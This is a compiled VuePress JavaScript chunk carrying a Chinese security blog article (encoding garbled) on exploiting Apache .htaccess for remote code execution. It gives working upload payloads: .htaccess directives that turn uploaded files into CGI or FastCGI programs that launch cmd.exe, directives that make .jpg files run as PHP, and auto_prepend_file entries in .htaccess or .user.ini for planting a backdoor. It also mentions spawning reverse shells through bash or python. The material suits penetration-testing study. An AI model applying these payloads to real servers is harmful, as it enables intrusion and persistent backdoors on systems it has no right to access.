(window.webpackJsonp=window.webpackJsonp||[]).push([[85],{409:function(e,a,s){"use strict";s.r(a);var t=s(4),r=Object(t.a)({},(function(){var e=this,a=e._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"htaccessæ–‡ä»¶åˆ©ç”¨"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#htaccessæ–‡ä»¶åˆ©ç”¨"}},[e._v("#")]),e._v(" .htaccessæ–‡ä»¶åˆ©ç”¨")]),e._v(" "),a("h2",{attrs:{id:"apacheè°ƒç”¨è§£æå™¨çš„ä¸‰ç§æ–¹å¼"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#apacheè°ƒç”¨è§£æå™¨çš„ä¸‰ç§æ–¹å¼"}},[e._v("#")]),e._v(" Apacheè°ƒç”¨è§£æå™¨çš„ä¸‰ç§æ–¹å¼")]),e._v(" "),a("p",[a("strong",[e._v("åœ¨æ™®éä½¿ç”¨çš„LAMPæ¶æ„ä¸­ï¼ŒApacheä¸PHPä¹‹é—´çš„äº¤äº’ï¼Œæœ‰ä¸‰ç§å¸¸è§çš„æ–¹å¼ã€‚")])]),e._v(" "),a("ul",[a("li",[e._v("ç¬¬ä¸€ç§æ˜¯æœ€é€šç”¨æœ€å¸¸è§çš„Moduleæ–¹å¼ï¼Œå³åœ¨httpd.confä¸­ä½¿ç”¨LoadModuleçš„æ–¹å¼ï¼Œå°†phpçš„dllæˆ–è€…soæ–‡ä»¶åŠ è½½åˆ°apacheå½“ä¸­")]),e._v(" "),a("li",[e._v("è¿˜æœ‰ä¸¤ç§æ˜¯CGIæ–¹å¼å’ŒFastCGIæ–¹å¼ã€‚å…¶å®åè€…ç”¨çš„è¶Šæ¥è¶Šå¹¿æ³›äº†ã€‚ä¸€èˆ¬PHP-FPMä¹Ÿæ˜¯ä¸FastCGIè¿›è¡Œé…åˆä½¿ç”¨çš„")]),e._v(" "),a("li",[e._v("å¯ä»¥å‚è€ƒ"),a("a",{attrs:{href:"https://www.awaimai.com/371.html",target:"_blank",rel:"noopener noreferrer"}},[e._v("CGIã€FastCGIå’ŒPHP-FPMå…³ç³»å›¾è§£"),a("OutboundLink")],1)])]),e._v(" "),a("h2",{attrs:{id:"cgiå¯åŠ¨æ–¹å¼çš„rceåˆ©ç”¨å§¿åŠ¿"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cgiå¯åŠ¨æ–¹å¼çš„rceåˆ©ç”¨å§¿åŠ¿"}},[e._v("#")]),e._v(" CGIå¯åŠ¨æ–¹å¼çš„RCEåˆ©ç”¨å§¿åŠ¿")]),e._v(" "),a("p",[e._v("å½“æˆ‘ä»¬äº†è§£åŸç†åï¼ŒApacheæ˜¯éœ€è¦è°ƒç”¨ç¬¬ä¸‰æ–¹CGIç¨‹åºï¼Œä½†æ˜¯ä¸€ä¸ªç¨‹åºæ˜¯ä¸æ˜¯CGIç¨‹åºè¿™ä¸ªäº‹å¾ˆéš¾ç•Œå®šï¼Œæˆ‘ä»¬èƒ½å¦é€šè¿‡è°ƒç”¨ç‰¹å®šçš„CGIç¨‹åº(æ™®é€šç¨‹åº)æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤å‘¢ï¼Œç­”æ¡ˆæ˜¯å¯ä»¥çš„")]),e._v(" "),a("h3",{attrs:{id:"åˆ©ç”¨æ¡ä»¶"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#åˆ©ç”¨æ¡ä»¶"}},[e._v("#")]),e._v(" åˆ©ç”¨æ¡ä»¶")]),e._v(" "),a("ol",[a("li",[e._v("ä¿è¯htaccessä¼šè¢«è§£æï¼Œå³å½“å‰ç›®å½•ä¸­é…ç½®äº†AllowOverride allæˆ–AllowOverride Options FileInfoAllowOverrideå‚æ•°å…·ä½“ä½œç”¨å¯å‚è€ƒApacheä¹‹AllowOverrideå‚æ•°è¯¦è§£(Require all grantedä¹Ÿæ˜¯éœ€è¦çš„)")]),e._v(" "),a("li",[e._v("cgi_moduleè¢«åŠ è½½ã€‚å³apacheé…ç½®æ–‡ä»¶ä¸­æœ‰LoadModule cgi_module modules/mod_cgi.soè¿™ä¹ˆä¸€å¥ä¸”æ²¡æœ‰è¢«æ³¨é‡Š")]),e._v(" "),a("li",[e._v("æœ‰ç›®å½•çš„ä¸Šä¼ ã€å†™å…¥æƒé™")])]),e._v(" "),a("h3",{attrs:{id:"åˆ©ç”¨å§¿åŠ¿"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#åˆ©ç”¨å§¿åŠ¿"}},[e._v("#")]),e._v(" åˆ©ç”¨å§¿åŠ¿")]),e._v(" "),a("p",[e._v("ä¸Šä¼ .htaccess æ–‡ä»¶, å†…å®¹å¦‚ä¸‹")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("Options ExecCGI\nAddHandler cgi-script .xx\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("Options ExecCGIè¡¨ç¤ºå…è®¸CGIæ‰§è¡Œï¼Œå¦‚æœAllowOverrideåªæœ‰FileInfoæƒé™ä¸”æœ¬èº«å°±å¼€å¯äº†ExecCGIçš„è¯ï¼Œå°±å¯ä»¥ä¸éœ€è¦è¿™å¥è¯äº†")]),e._v(" "),a("p",[e._v("ç¬¬äºŒå¥å‘Šè¯‰Apacheå°†xxåç¼€åçš„æ–‡ä»¶ï¼Œå½“åšCGIç¨‹åºè¿›è¡Œè§£æ")]),e._v(" "),a("p",[e._v("æ¥ä¸‹æ¥ï¼Œä»¥Windowså¹³å°ä¸ºä¾‹ï¼Œä¸Šä¼ poc.xxæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("#!C:/Windows/System32/cmd.exe /c start calc.exe\n1\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("ç¬¬ä¸€è¡Œç”¨æ¥è¡¨ç¤ºCGIç¨‹åºçš„è·¯å¾„ã€‚å¯ä»¥éšä¾¿å¼€ä½ çš„è„‘æ´")]),e._v(" "),a("p",[e._v("å› ä¸ºCGIç¨‹åºå¤„ç†å®Œæˆåï¼Œä¼šè¢«Apacheå…³é—­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¦ç”¨å¯åŠ¨æ–°è¿›ç¨‹çš„æ–¹å¼æ¥å¯åŠ¨")]),e._v(" "),a("p",[e._v("ç»“æœï¼Œè¿™æ—¶è®¿é—®poc.xxï¼Œè®¡ç®—å™¨å°±å‡ºæ¥äº†")]),e._v(" "),a("p",[e._v("æ‹¿ç«ç»’å‰‘æ¥çœ‹ä¸‹")]),e._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/htaccess001.png",alt:"htaccess001"}})]),e._v(" "),a("p",[e._v("ä¸€ç›®äº†ç„¶ï¼Œè¯»å–äº†ä¸¤ä¸ªæ–‡ä»¶åï¼Œhttpd.exeçš„mod_cgi.soæ¨¡å—æ‰§è¡Œäº†æˆ‘ä»¬çš„å‘½ä»¤")]),e._v(" "),a("p",[e._v("linuxç¯å¢ƒä¸‹ï¼Œä¹Ÿæ˜¯éšä½ ç©ï¼Œæ˜¯ç›´æ¥è°ƒç”¨/bin/bashè¿˜æ˜¯è°ƒç”¨/usr/bin/pythonæ¥åå¼¹Shellã€‚éƒ½æ˜¯å¯ä»¥çš„ã€‚è¿™å…¶å®ä¹Ÿå°±æ˜¯æ­£å¸¸ä½¿ç”¨æ–¹å¼ï¼Œå› ä¸ºPythonä¹Ÿä¼šè¢«ç”¨ä½œä¸ºCGIè§£æç¨‹åº")]),e._v(" "),a("h2",{attrs:{id:"fastcgiå¯åŠ¨æ–¹å¼çš„rceåˆ©ç”¨å§¿åŠ¿"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#fastcgiå¯åŠ¨æ–¹å¼çš„rceåˆ©ç”¨å§¿åŠ¿"}},[e._v("#")]),e._v(" FastCGIå¯åŠ¨æ–¹å¼çš„RCEåˆ©ç”¨å§¿åŠ¿")]),e._v(" "),a("p",[e._v("æˆ‘ä»¬å†æ¥çœ‹çœ‹FastCGIæ¨¡å¼çš„ï¼Œè¿™ä¸ªä¾èµ–çš„æ˜¯mod_fcgid.soï¼Œé»˜è®¤å®‰è£…åŒ…é‡Œç”šè‡³æ²¡æœ‰è¿™ä¸ªsoæ–‡ä»¶ï¼Œä¸è¿‡åœ¨PHPStudyçš„é»˜è®¤é…ç½®ä¸­ï¼Œå°±å·²ç»æ˜¯åŠ è½½äº†çš„ï¼Œå¹¶ä¸”AllowOverrideä¹Ÿæ˜¯Allæƒé™ï¼Œæ‰‹åŠ¨æ–œçœ¼")]),e._v(" "),a("p",[e._v("å…¶å®è¿˜æœ‰mod_proxy_fcgiï¼Œæ›´ä¸ºå¸¸è§ï¼Œä¹Ÿæ˜¯é»˜è®¤å¼€å¯çš„ï¼Œè¿˜ä¸æ¸…æ¥šèƒ½å¦åˆ©ç”¨ï¼Œå¯ä»¥è‡ªè¡Œå°è¯•ä¸€ä¸‹")]),e._v(" "),a("h3",{attrs:{id:"åˆ©ç”¨æ¡ä»¶-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#åˆ©ç”¨æ¡ä»¶-2"}},[e._v("#")]),e._v(" åˆ©ç”¨æ¡ä»¶")]),e._v(" "),a("ol",[a("li",[a("p",[e._v("AllowOverride allæˆ–AllowOverride Options FileInfo")])]),e._v(" "),a("li",[a("p",[e._v("mod_fcgid.soè¢«åŠ è½½ã€‚å³apacheé…ç½®æ–‡ä»¶ä¸­æœ‰LoadModule fcgid_module modules/mod_fcgid.so")])]),e._v(" "),a("li",[a("p",[e._v("æœ‰ç›®å½•çš„ä¸Šä¼ ã€å†™å…¥æƒé™")])])]),e._v(" "),a("h3",{attrs:{id:"åˆ©ç”¨å§¿åŠ¿-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#åˆ©ç”¨å§¿åŠ¿-2"}},[e._v("#")]),e._v(" åˆ©ç”¨å§¿åŠ¿")]),e._v(" "),a("p",[e._v("ä¸Šä¼ .htaccess æ–‡ä»¶, å†…å®¹å¦‚ä¸‹ï¼š")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('Options +ExecCGI\nAddHandler fcgid-script .abc\nFcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br")])]),a("p",[e._v("è€æ ·å­ï¼Œå¦‚æœé»˜è®¤å°±å¼€å¯äº†ExecCGIï¼Œåˆ™ç¬¬ä¸€å¥å¯ä»¥çœç•¥")]),e._v(" "),a("p",[e._v("ç¬¬äºŒå¥è¡¨ç¤ºï¼Œabcåç¼€åçš„æ–‡ä»¶éœ€è¦è¢«fcgiæ¥è§£æã€‚AddHandlerè¿˜å¯ä»¥æ¢æˆAddType")]),e._v(" "),a("p",[e._v("å†ä¸Šä¼ 1.abcã€‚å†…å®¹æ— æ‰€è°“")]),e._v(" "),a("p",[e._v("ç»“æœï¼Œè®¿é—®1.abcï¼Œè®¡ç®—å™¨å°±å‡ºæ¥äº†ï¼Œå†æ‹¿ç«ç»’å‰‘çœ‹ä¸‹")]),e._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/htaccess002.png",alt:"htaccess002"}})]),e._v(" "),a("p",[e._v("tipsï¼šè‹¥æ‹¥æœ‰ä¸Šä¼ æƒé™ï¼Œä»¥ä¸Šä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œåœ¨PHPstudyé»˜è®¤é…ç½®å½“ä¸­ï¼Œéƒ½æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨çš„")]),e._v(" "),a("h3",{attrs:{id:"ä½¿ç”¨ç›¸å¯¹è·¯å¾„"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä½¿ç”¨ç›¸å¯¹è·¯å¾„"}},[e._v("#")]),e._v(" ä½¿ç”¨ç›¸å¯¹è·¯å¾„")]),e._v(" "),a("p",[e._v("å…¶å®ä¸€äº›å°ä¼™ä¼´ä¹Ÿå·²ç»å‘ç°äº†ï¼Œä¸Šé¢çš„é—®é¢˜å†é…åˆæœ‰ä¸Šä¼ æ¼æ´ï¼Œæˆ‘ç”šè‡³å¯ä»¥ä¼ ä¸ªğŸä¸Šå»ã€‚ä½†æ˜¯æ— è®ºæ˜¯CGIè¿˜æ˜¯FastCGIä¼¼ä¹éƒ½æ˜¯ç»å¯¹è·¯å¾„ï¼Œç›¸å¯¹è·¯å¾„å¯ä¸å¯ä»¥å‘¢")]),e._v(" "),a("p",[e._v("ç»è¿‡äº†ä¸€äº›å°è¯•ï¼Œå¹¶è¯·æ•™äº†â€è£¤è¡©å“¥â€,å‘ç°ç›¸å¯¹è·¯å¾„ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œèµ·å§‹ç‚¹ä¼¼ä¹å’Œsession.save_pathå˜é‡çš„å€¼æ˜¯ä¸€è‡´çš„ã€‚å¦‚å›¾ï¼Œæ¯”å¦‚phpstudyå½“ä¸­ï¼Œèµ·å§‹ç‚¹å°±æ˜¯åœ¨\\Extensions\\tmp\\tmpä¸­")]),e._v(" "),a("p",[a("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/htaccess003.png",alt:"htaccess003"}})]),e._v(" "),a("p",[e._v("é‚£ä¹ˆï¼Œæ¯”å¦‚è¯´æˆ‘æƒ³è¦htmlåç¼€ä½¿ç”¨phpæ¥è§£æã€‚å°±å¯ä»¥è¿™æ ·å†™")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('AddHandler fcgid-script .html\nFcgidWrapper "../../php/php7.3.4nts/php-cgi.exe" .html\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("å†æ¥ï¼Œæˆ‘æƒ³è°ƒç”¨ç½‘ç«™æ ¹ç›®å½•çš„calc.exeã€‚å¯ä»¥è¿™æ ·")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('AddHandler fcgid-script .xx\nFcgidWrapper "../../../WWW/localhost/calc.exe" .xx\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("ä¸è¿‡è®¡ç®—å™¨æ— æ³•æ­£å¸¸å¼¹å‡ºã€‚çŒœåº”è¯¥æ˜¯å› ä¸ºcalcæ¯•ç«Ÿä¸æ˜¯ä¸ªæ ‡å‡†CGIç¨‹åºå¯¼è‡´çš„å§ã€‚è€Œä¸”ä¹Ÿæ²¡å¿…è¦ç»•è¿™ä¹ˆå¤§ä¸ªåœˆå­ï¼Œå°±æ²¡ç»§ç»­æµ‹è¯•äº†")]),e._v(" "),a("h2",{attrs:{id:"å…¶ä»–å¸¸è§„åˆ©ç”¨å§¿åŠ¿"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å…¶ä»–å¸¸è§„åˆ©ç”¨å§¿åŠ¿"}},[e._v("#")]),e._v(" å…¶ä»–å¸¸è§„åˆ©ç”¨å§¿åŠ¿")]),e._v(" "),a("h3",{attrs:{id:"å°†ç‰¹å®šæ–‡ä»¶ä½œä¸ºphpè§£æ-ç”¨ä½œåé—¨"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#å°†ç‰¹å®šæ–‡ä»¶ä½œä¸ºphpè§£æ-ç”¨ä½œåé—¨"}},[e._v("#")]),e._v(" å°†ç‰¹å®šæ–‡ä»¶ä½œä¸ºphpè§£æï¼Œç”¨ä½œåé—¨")]),e._v(" "),a("p",[e._v("Moduleæ¨¡å¼ä¸‹å†™æ³•å¦‚ä¸‹ï¼š")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("AddType application/x-httpd-php .jpg\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br")])]),a("p",[e._v("æˆ–")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('  <FilesMatch "test.jpg">\n    SetHandler application/x-httpd-php\n  </FilesMatch>\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br")])]),a("p",[e._v("ç”šè‡³å¯ä»¥å°† .htaccessæœ¬èº«ä½œä¸ºphpæ¥è§£æï¼Œé‡Œé¢ç¼–å†™ä¸€å¥è¯ã€‚è¿™å—ç½‘ç»œä¸Šç›¸å…³èµ„æ–™å¾ˆå¤š")]),e._v(" "),a("h3",{attrs:{id:"phpç¯å¢ƒä¸‹ä½¿ç”¨-auto-prepend-file-æˆ–-auto-append-file-åˆ›å»ºåé—¨"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phpç¯å¢ƒä¸‹ä½¿ç”¨-auto-prepend-file-æˆ–-auto-append-file-åˆ›å»ºåé—¨"}},[e._v("#")]),e._v(" PHPç¯å¢ƒä¸‹ä½¿ç”¨ auto_prepend_file æˆ– auto_append_file åˆ›å»ºåé—¨")]),e._v(" "),a("p",[e._v("é€šè¿‡é…ç½®auto_append_fileæˆ–auto_prepend_fileå¯ä»¥å‘æ‰€æœ‰phpæ–‡ä»¶ä¸­çš„å¼€å¤´æˆ–å°¾éƒ¨æ’å…¥æŒ‡å®šçš„æ–‡ä»¶çš„å†…å®¹")]),e._v(" "),a("p",[e._v("åœ¨. htaccessä¸­çš„å†™å…¥å¦‚ä¸‹ï¼š")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v('php_value auto_prepend_file "/home/fdipzone/header.php"\nphp_value auto_append_file "/home/fdipzone/footer.php"\n')])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br")])]),a("p",[e._v("å¯¹äºCGI/FastCGIæ¨¡å¼ PHP 5.3.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ åœ¨ç›®å½•ä¸‹åˆ›å»º.user.iniæ–‡ä»¶ ã€‚æ¥å¼•å…¥è¯¥å‚æ•°ã€‚å†™æ³•å¦‚ä¸‹ï¼š")]),e._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[e._v("auto_prepend_file = hackdoor.gif\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br")])]),a("p",[a("a",{attrs:{href:"https://www.cnblogs.com/anbuxuan/p/11867129.html",target:"_blank",rel:"noopener noreferrer"}},[e._v("åŸæ–‡é“¾æ¥"),a("OutboundLink")],1)])])}),[],!1,null,null,null);a.default=r.exports}}]);